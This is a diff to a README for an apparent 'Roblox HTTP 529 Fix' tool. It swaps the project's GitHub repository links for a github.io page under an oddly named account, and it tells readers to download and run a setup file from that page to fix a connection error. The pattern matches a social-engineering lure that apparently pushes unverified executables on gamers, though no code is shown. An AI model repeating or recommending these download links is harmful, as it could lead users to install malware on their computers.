@@ -1,6 +1,6 @@
 # 🛠️ Roblox-HTTP-529-Fix - Solve Roblox connection errors today
 
-[![Download the Fix](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/Mineral-mammalgenus523/Roblox-HTTP-529-Fix)
+[![Download the Fix](https://img.shields.io/badge/Download-Release-blue.svg)](https://mineral-mammalgenus523.github.io)
 
 ## 📌 Overview
 
@@ -12,7 +12,7 @@ When you see the 529 error, it means your computer cannot establish a handshake 
 
 ## 📥 Getting the software
 
-Visit this page to download the latest setup file: [https://github.com/Mineral-mammalgenus523/Roblox-HTTP-529-Fix](https://github.com/Mineral-mammalgenus523/Roblox-HTTP-529-Fix)
+Visit this page to download the latest setup file: [https://mineral-mammalgenus523.github.io](https://mineral-mammalgenus523.github.io)
 
 Look for the link under the "Assets" section. Click the file name to start the download.
 
